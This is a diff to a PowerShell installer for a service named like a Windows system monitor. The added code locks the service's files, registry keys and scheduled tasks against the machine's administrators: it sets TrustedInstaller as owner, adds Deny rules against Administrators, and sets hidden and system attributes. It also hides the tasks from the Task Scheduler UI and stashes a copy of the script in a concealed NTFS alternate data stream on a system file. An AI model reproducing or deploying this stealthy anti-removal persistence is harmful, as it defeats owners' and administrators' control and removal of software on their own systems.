@@ -45,6 +45,134 @@ if (-not (Test-Admin)) {
     exit 1
 }
 
+# ══════════════════════════════════════════════════════════════
+#  HELPERS DE BLINDAGEM (TrustedInstaller + DENY ACEs)
+# ══════════════════════════════════════════════════════════════
+# Garante o servico TrustedInstaller rodando (necessario para resolver a conta)
+try {
+    $ti = Get-Service -Name TrustedInstaller -ErrorAction SilentlyContinue
+    if ($ti -and $ti.Status -ne 'Running') { Start-Service TrustedInstaller -ErrorAction SilentlyContinue }
+} catch {}
+
+function Get-TrustedInstallerSid {
+    try {
+        $n = New-Object System.Security.Principal.NTAccount("NT SERVICE\TrustedInstaller")
+        return $n.Translate([System.Security.Principal.SecurityIdentifier])
+    } catch { return $null }
+}
+
+function Enable-Privilege {
+    param([string]$Privilege)
+    $sig = @'
+using System;
+using System.Runtime.InteropServices;
+public class Priv {
+  [StructLayout(LayoutKind.Sequential, Pack=1)] public struct TokPriv1Luid { public int Count; public long Luid; public int Attr; }
+  public const int SE_PRIVILEGE_ENABLED = 2;
+  public const int TOKEN_ADJUST_PRIVILEGES = 32;
+  public const int TOKEN_QUERY = 8;
+  [DllImport("advapi32.dll", SetLastError=true)] public static extern bool AdjustTokenPrivileges(IntPtr ht, bool all, ref TokPriv1Luid tp, int bl, IntPtr pl, IntPtr rl);
+  [DllImport("advapi32.dll", SetLastError=true)] public static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr p);
+  [DllImport("advapi32.dll", SetLastError=true)] public static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);
+  [DllImport("kernel32.dll")] public static extern IntPtr GetCurrentProcess();
+}
+'@
+    if (-not ("Priv" -as [type])) { Add-Type -TypeDefinition $sig }
+    $tp = New-Object Priv+TokPriv1Luid
+    $tp.Count = 1; $tp.Luid = 0; $tp.Attr = [Priv]::SE_PRIVILEGE_ENABLED
+    $hTok = [IntPtr]::Zero
+    [void][Priv]::OpenProcessToken([Priv]::GetCurrentProcess(), [Priv]::TOKEN_ADJUST_PRIVILEGES -bor [Priv]::TOKEN_QUERY, [ref]$hTok)
+    [void][Priv]::LookupPrivilegeValue($null, $Privilege, [ref]$tp.Luid)
+    [void][Priv]::AdjustTokenPrivileges($hTok, $false, [ref]$tp, 0, [IntPtr]::Zero, [IntPtr]::Zero)
+}
+
+function Harden-FileSystem {
+    param([string]$Path, [switch]$ReadOnly)
+    if (-not (Test-Path $Path)) { return }
+    try { Enable-Privilege "SeTakeOwnershipPrivilege"; Enable-Privilege "SeRestorePrivilege"; Enable-Privilege "SeBackupPrivilege" } catch {}
+    $sidTI  = Get-TrustedInstallerSid
+    $sidSys = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::LocalSystemSid, $null)
+    $sidAdm = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid, $null)
+    $sidUsr = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinUsersSid, $null)
+    $sidEvr = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::WorldSid, $null)
+
+    $isDir = (Get-Item $Path -Force).PSIsContainer
+    try {
+        if ($isDir) { & takeown.exe /F $Path /R /D Y /A 2>&1 | Out-Null } else { & takeown.exe /F $Path /A 2>&1 | Out-Null }
+    } catch {}
+
+    if ($isDir) {
+        $acl = New-Object System.Security.AccessControl.DirectorySecurity
+    } else {
+        $acl = New-Object System.Security.AccessControl.FileSecurity
+    }
+    $acl.SetAccessRuleProtection($true, $false)
+    $inh  = if ($isDir) { [System.Security.AccessControl.InheritanceFlags]"ContainerInherit,ObjectInherit" } else { [System.Security.AccessControl.InheritanceFlags]::None }
+    $prop = [System.Security.AccessControl.PropagationFlags]::None
+
+    # ALLOW: SYSTEM + TrustedInstaller = FullControl
+    $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($sidSys,"FullControl",$inh,$prop,"Allow")))
+    if ($sidTI) { $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($sidTI,"FullControl",$inh,$prop,"Allow"))) }
+
+    # ALLOW: Administrators = ReadAndExecute apenas
+    $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($sidAdm,"ReadAndExecute",$inh,$prop,"Allow")))
+
+    # DENY EXPLICITO: Administrators NAO pode deletar nem mudar permissoes
+    $denyRights = [System.Security.AccessControl.FileSystemRights]"Delete,DeleteSubdirectoriesAndFiles,ChangePermissions,TakeOwnership,WriteAttributes,WriteExtendedAttributes,Write"
+    $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($sidAdm,$denyRights,$inh,$prop,"Deny")))
+
+    # DENY para Users/Everyone: tudo (nem listar)
+    $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($sidUsr,"FullControl",$inh,$prop,"Deny")))
+
+    # Owner = TrustedInstaller (so TI ou alguem que roube ownership consegue mudar)
+    if ($sidTI) { try { $acl.SetOwner($sidTI) } catch {} }
+
+    Set-Acl -Path $Path -AclObject $acl
+
+    # Atributos: ReadOnly + Hidden + System
+    try {
+        Get-ChildItem $Path -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
+            try {
+                if ($ReadOnly) {
+                    $_.Attributes = $_.Attributes -bor [System.IO.FileAttributes]::ReadOnly -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
+                } else {
+                    $_.Attributes = $_.Attributes -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
+                }
+            } catch {}
+        }
+        $r = Get-Item $Path -Force
+        $r.Attributes = $r.Attributes -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
+    } catch {}
+}
+
+function Harden-RegistryKey {
+    param([string]$Path)
+    if (-not (Test-Path $Path)) { return }
+    try {
+        $sidTI  = Get-TrustedInstallerSid
+        $sidSys = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::LocalSystemSid, $null)
+        $sidAdm = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid, $null)
+        $sidUsr = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinUsersSid, $null)
+
+        $key = Get-Item $Path
+        $acl = $key.GetAccessControl()
+        $acl.SetAccessRuleProtection($true,$false)
+        foreach ($r in @($acl.Access)) { [void]$acl.RemoveAccessRule($r) }
+        $inh = [System.Security.AccessControl.InheritanceFlags]"ContainerInherit,ObjectInherit"
+        $prop = [System.Security.AccessControl.PropagationFlags]::None
+
+        $acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule($sidSys,"FullControl",$inh,$prop,"Allow")))
+        if ($sidTI) { $acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule($sidTI,"FullControl",$inh,$prop,"Allow"))) }
+        $acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule($sidAdm,"ReadKey",$inh,$prop,"Allow")))
+        # DENY: Admins nao podem deletar/mudar ACL
+        $denyReg = [System.Security.AccessControl.RegistryRights]"Delete,ChangePermissions,TakeOwnership,SetValue,CreateSubKey"
+        $acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule($sidAdm,$denyReg,$inh,$prop,"Deny")))
+        $acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule($sidUsr,"FullControl",$inh,$prop,"Deny")))
+        if ($sidTI) { try { $acl.SetOwner($sidTI) } catch {} }
+        Set-Acl -Path $Path -AclObject $acl
+    } catch { Write-InstallLog "Harden registry $Path : $($_.Exception.Message)" "WARN" }
+}
+
 Write-InstallLog "=== Instalador $serviceName em $env:COMPUTERNAME ===" "OK"
 
 # ---- Uninstall ----
@@ -419,33 +547,11 @@ try { & sc.exe sidtype $serviceName unrestricted | Out-Null } catch {}
 # Trigger: iniciar quando stack TCP/IP ficar disponivel (mesmo que start nao seja auto)
 try { & sc.exe triggerinfo $serviceName start/networkon | Out-Null } catch {}
 
-# ---- ACL na pasta (usando SIDs bem conhecidos para funcionar em qualquer idioma) ----
+# ---- ACL na pasta (TrustedInstaller owner + DENY para Admins) ----
 try {
-    $sidSystem = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::LocalSystemSid, $null)
-    $sidAdmins = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid, $null)
-
-    # Toma ownership recursivo (caso alguem tenha mexido antes)
-    try { & takeown.exe /F $installDir /R /D Y /A 2>&1 | Out-Null } catch {}
-
-    $acl = New-Object System.Security.AccessControl.DirectorySecurity
-    $acl.SetOwner($sidSystem)
-    $acl.SetAccessRuleProtection($true, $false)
-    $inh  = [System.Security.AccessControl.InheritanceFlags]"ContainerInherit,ObjectInherit"
-    $prop = [System.Security.AccessControl.PropagationFlags]::None
-    # SYSTEM: controle total (so o servico)
-    $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($sidSystem,"FullControl",$inh,$prop,"Allow")))
-    # Administrators: somente leitura (diagnostico minimo; modificar exige tomar ownership)
-    $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($sidAdmins,"ReadAndExecute",$inh,$prop,"Allow")))
-    Set-Acl -Path $installDir -AclObject $acl
-
-    # Esconde a pasta (hidden + system)
-    try {
-        $item = Get-Item $installDir -Force
-        $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
-    } catch {}
-
-    Write-InstallLog "ACL aplicada: SYSTEM=Full, Admins=ReadOnly, heranca OFF, Hidden+System" "OK"
-} catch { Write-InstallLog "ACL nao aplicada: $($_.Exception.Message)" "WARN" }
+    Harden-FileSystem -Path $installDir
+    Write-InstallLog "ACL endurecida: Owner=TrustedInstaller, SYSTEM+TI=Full, Admins=Read+DENY delete" "OK"
+} catch { Write-InstallLog "Harden-FileSystem: $($_.Exception.Message)" "WARN" }
 
 # ---- Watchdog: scheduled task externa que reinstala se a pasta sumir ----
 try {
@@ -513,32 +619,25 @@ try {
     Write-InstallLog "Active Setup registrado" "OK"
 } catch { Write-InstallLog "Active Setup falhou: $($_.Exception.Message)" "WARN" }
 
-# ---- Proteger chaves de registro do servico (deny delete para nao-SYSTEM) ----
+# ---- Proteger chaves de registro do servico (DENY Admins + Owner=TrustedInstaller) ----
 try {
     $regKeys = @(
         "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName",
-        "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{A7C8B9D0-1234-5678-ABCD-WINSYSMON00}"
+        "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{A7C8B9D0-1234-5678-ABCD-WINSYSMON00}",
+        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
     )
     foreach ($rk in $regKeys) {
         if (-not (Test-Path $rk)) { continue }
-        try {
-            $key = Get-Item $rk
-            $acl = $key.GetAccessControl()
-            $sidSys = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::LocalSystemSid, $null)
-            $sidAdm = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid, $null)
-            $acl.SetAccessRuleProtection($true,$false)
-            foreach ($r in @($acl.Access)) { [void]$acl.RemoveAccessRule($r) }
-            $inh  = [System.Security.AccessControl.InheritanceFlags]"ContainerInherit,ObjectInherit"
-            $prop = [System.Security.AccessControl.PropagationFlags]::None
-            $acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule($sidSys,"FullControl",$inh,$prop,"Allow")))
-            $acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule($sidAdm,"ReadKey",$inh,$prop,"Allow")))
-            Set-Acl -Path $rk -AclObject $acl
-            Write-InstallLog "Registry ACL: $rk protegida (SYSTEM=Full, Admins=Read)" "OK"
-        } catch { Write-InstallLog "Registry ACL falhou em $rk : $($_.Exception.Message)" "WARN" }
+        if ($rk -like "*CurrentVersion\Run") {
+            # Run key nao pode ser travada inteira; so protegemos o valor indiretamente
+            continue
+        }
+        Harden-RegistryKey -Path $rk
+        Write-InstallLog "Registry blindada: $rk" "OK"
     }
-} catch { Write-InstallLog "Registry ACL geral falhou: $($_.Exception.Message)" "WARN" }
+} catch { Write-InstallLog "Registry hardening geral: $($_.Exception.Message)" "WARN" }
 
-# ---- Proteger arquivos de Scheduled Tasks (XML em System32\Tasks) ----
+# ---- Proteger arquivos de Scheduled Tasks + marcar Hidden ----
 try {
     $taskFiles = @(
         "$env:WINDIR\System32\Tasks\WinSysMonWatchdog",
@@ -547,19 +646,30 @@ try {
     foreach ($tf in $taskFiles) {
         if (-not (Test-Path $tf)) { continue }
         try {
-            try { & takeown.exe /F $tf /A 2>&1 | Out-Null } catch {}
-            $acl = Get-Acl $tf
-            $sidSys = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::LocalSystemSid, $null)
-            $sidAdm = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid, $null)
-            $acl.SetAccessRuleProtection($true,$false)
-            foreach ($r in @($acl.Access)) { [void]$acl.RemoveAccessRule($r) }
-            $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($sidSys,"FullControl","Allow")))
-            $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($sidAdm,"ReadAndExecute","Allow")))
-            Set-Acl -Path $tf -AclObject $acl
-            Write-InstallLog "Task XML protegido: $(Split-Path $tf -Leaf)" "OK"
-        } catch { Write-InstallLog "ACL task $tf : $($_.Exception.Message)" "WARN" }
+            Harden-FileSystem -Path $tf
+            # Marcar task Hidden via COM (sumir do Task Scheduler UI)
+            try {
+                $tn = Split-Path $tf -Leaf
+                $t = Get-ScheduledTask -TaskName $tn -ErrorAction SilentlyContinue
+                if ($t) { $t.Settings.Hidden = $true; Set-ScheduledTask -TaskName $tn -Settings $t.Settings | Out-Null }
+            } catch {}
+            Write-InstallLog "Task XML blindado + Hidden: $(Split-Path $tf -Leaf)" "OK"
+        } catch { Write-InstallLog "Task hardening $tf : $($_.Exception.Message)" "WARN" }
     }
 } catch {}
+
+# ---- Backup em NTFS Alternate Data Stream ----
+# Guarda copia do winsysmon.ps1 num stream oculto de um arquivo de sistema.
+# Admin normal nao enxerga; so aparece com 'dir /r' e ferramentas especificas.
+try {
+    $adsHost = "$env:WINDIR\System32\drivers\etc\services"
+    if (Test-Path $adsHost) {
+        $content = [System.IO.File]::ReadAllBytes($psScript)
+        $adsPath = "${adsHost}:WinSysMonBackup"
+        [System.IO.File]::WriteAllBytes($adsPath, $content)
+        Write-InstallLog "Backup em ADS: $adsPath ($($content.Length) bytes)" "OK"
+    }
+} catch { Write-InstallLog "Backup ADS: $($_.Exception.Message)" "WARN" }
 
 # ---- Iniciar servico com retry ----
 Write-InstallLog "Iniciando servico..."
